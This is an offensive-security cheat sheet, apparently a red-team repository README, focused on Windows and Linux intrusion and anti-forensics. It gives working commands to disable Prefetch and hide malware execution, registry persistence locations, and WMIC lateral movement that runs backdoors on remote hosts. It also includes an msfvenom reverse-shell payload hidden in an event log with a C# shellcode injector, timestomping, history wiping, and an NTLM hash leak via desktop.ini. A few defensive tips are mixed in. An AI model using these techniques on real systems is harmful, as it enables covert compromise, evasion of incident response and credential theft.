# :fu: Anti-Forensics

## Disabling Prefetch:

What are Prefetch Files? Prefetch files are great artifacts for forensic investigators trying to analyze applications that have been run on a system. Windows creates a prefetch file when an application is run from a particular location for the very first time. This is used to help speed up the loading of applications. But if we disable Prefetch files, we can hide execution patterns of our malware to hinder incident response.

The following command requires Administrator privileges, but disables Prefetch within the registry. While this tactic may appear anomalous to network defenders such as clearing Security Event Logs, it will obfuscate the malware's execution history.

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /f /d 0
```

## Windows AutoStart Persistence Locations:

Locations for automatically starting at system boot or user logon

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Debug Tools-%LOCALAPPDATA%\
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
software\microsoft\windows\currentversion\run\microsoft windows html help
%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
```

## WMIC Tricks and Tips:

Enumeration

```
wmic environment list
wmic useraccount get /ALL /format:csv
wmic process get caption,executablepath,commandline /format:csv
wmic qfe get description,installedOn /format:csv
# PowerShell
Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}
```

Lateral Movement

```
wmic /node:<IP> /user:administrator process call create "cmd.exe /c <backdoor>"
```

Uninstall Program

```
wmic /node:"#{node}" product where "name like '#{product}%%'" call uninstall
```

Execute a .EXE file stored as an Alternate Data Stream (ADS)

```
wmic.exe process call create "c:\ads\notsus.txt:malicious.exe"
```

Execute malicious.exe on a remote system

```
wmic.exe /node:"192.168.0.99" process call create "malicious.exe"
```

## Passive OS Detection and TCP Fingerprinting:

![image](https://user-images.githubusercontent.com/72598486/216523402-aceea591-a143-4145-bdbc-f2b02027682e.png)

## Offline Microsoft Azure Active Directory Harvesting with PowerShell:

This script demonstrates how to interact with Microsoft Azure Active Directory via PowerShell.  You will need an Azure AD account first, which is free: http://azure.microsoft.com/en-us/services/active-directory/

```
# Import the Azure AD PowerShell module:
Import-Module -Name Azure
# List the cmdlets provided by the module (750+):
Get-Command -Module Azure 
Add-AzureAccount
Get-AzureAccount
Get-AzureSubscription

# Import the Azure AD PowerShell module for MSOnline:
Import-Module -Name MSOnline
# List the cmdlets provided by the MSOnline module:
Get-Command -Module MSOnline

# Connect and authenticate to Azure AD, where your username will
# be similar to '<yourusername>@<yourdomain>.onmicrosoft.com':
$creds = Get-Credential
Connect-MsolService -Credential $creds


# Get subscriber company contact information:
Get-MsolCompanyInformation


# Get subscription and license information:
Get-MsolSubscription | Format-List *
Get-MsolAccountSku   | Format-List *


# Get Azure AD users:
Get-MsolUser


# Get list of Azure AD management roles:
Get-MsolRole


# Show the members of each management role:
Get-MsolRole | ForEach { "`n`n" ; "-" * 30 ; $_.Name ; "-" * 30 ; Get-MsolRoleMember -RoleObjectId $_.ObjectId | ForEach { $_.DisplayName } }
```

## PowerShell:

Pull Windows Defender event logs 1116 (malware detected) and 1117 (malware blocked)
from a saved evtx file:

```
PS C:\> Get-WinEvent -FilterHashtable @{path="WindowsDefender.evtx";id=1116,1117}
```
Check for installed antivirus:

```
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

## Execute Payloads Utilizing Windows Event Logs:

Create variable to contain payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<> LPORT=<> -f hex
```

```
$msf = '<Insert Shellcode as Hex Literal String'
```

Convert Payload variable to hex byte array:

```
$hashByteArray = [byte[]] ($payload -replace '..', '0x$&,' -split ',' -ne '')
```

Create new event log entry:

```
Write-Event -LogName 'Key Management Service' -Source KmsRequests -EventID 31337 -EventType Information -Category 0 -Message 'Here be Dragons' -RawData $HashByteArray
```

Start your listener:

```
nc -nvlp 1337
```

Execute code injector utilizing this code:

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace EventLogsForRedTeams
{
    class Program
    { 

    [DllImport("kernel32.dll")]
    public static extern Boolean VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect,
            out UInt32 lpflOldProtect);

    private delegate IntPtr ptrShellCode();
    static void Main(string[] args)
    {
        // Create a new EventLog object.
        EventLog theEventLog1 = new EventLog();

        theEventLog1.Log = "Key Management Service";

        // Obtain the Log Entries of the Event Log
        EventLogEntryCollection myEventLogEntryCollection = theEventLog1.Entries;

        byte[] data_array = myEventLogEntryCollection[0].Data;

        Console.WriteLine("*** Found Payload in " + theEventLog1.Log + " ***");
        Console.WriteLine("");
        Console.WriteLine("*** Injecting Payload ***");

        // inject the payload
        GCHandle SCHandle = GCHandle.Alloc(data_array, GCHandleType.Pinned);
        IntPtr SCPointer = SCHandle.AddrOfPinnedObject();
        uint flOldProtect;

        if (VirtualProtect(SCPointer, (UIntPtr)data_array.Length, 0x40, out flOldProtect))
        {
            ptrShellCode sc = (ptrShellCode)Marshal.GetDelegateForFunctionPointer(SCPointer, typeof(ptrShellCode));
            sc();
        }
    }
}
}
```

@BHIS 
Source: https://github.com/roobixx/EventLogForRedTeams

## Linux Timestomping:

Timestomping is an anti-forensics technique which is used to modify the timestamps of a file, often to mimic files that are in the same folder.

Set the last access time of file1 to January 02 15:45 of current year. It’s format is MMDDHHMM.

```
$ touch -c -a 01021545 payload.elf
```

Set last modification date of a file with -m option.

```
$ touch -c -m 01021545 payload.elf
```

Use the -r option and the file we want to inherit its access and modification timestamp. In this example we will use normal.elf last access and modification timestamp for newly created payload.elf.

```
$ touch -r normal.elf payload.elf
```
## Linux Bash History Stomping:

One-liner:

```
$ export HISTFILE=/dev/null; unset HISTFILESIZE; unset HISTSIZE
```

Defenders can also enable timestamps in ```.bash_history``` using the command: ```export HISTTIMEFORMAT='%F %T '```

## Taking Apart URL Shorteners with cURL:

Ever get a "shortened" url (bit.ly, tinyurl.com or whatever) and stress about "clicking that link"?  Or worse yet, have that "Oh No" moment after you just clicked it? Let's use cURL to avoid this!

```
$ curl -k -v -I <URL> 2>&1 | grep -i "< location" | cut -d " " -f 3
```

Output:

```
$ curl -k -v -I https://bit.ly/3ABvcy5 2>&1 | grep -i "< location" | cut -d " " -f 3
https://isc.sans.edu/
```

## NTLM Leak via Desktop.ini:

The desktop.ini files contain the information of the icons you have applied to the folder. We can abuse this to resolve a network path. Once you open the folder you should get the hashes.

```
mkdir openMe
attrib +s openMe
cd openMe
echo [.ShellClassInfo] > desktop.ini
echo IconResource=\\192.168.0.1\aa >> desktop.ini
attrib +s +h desktop.ini
```
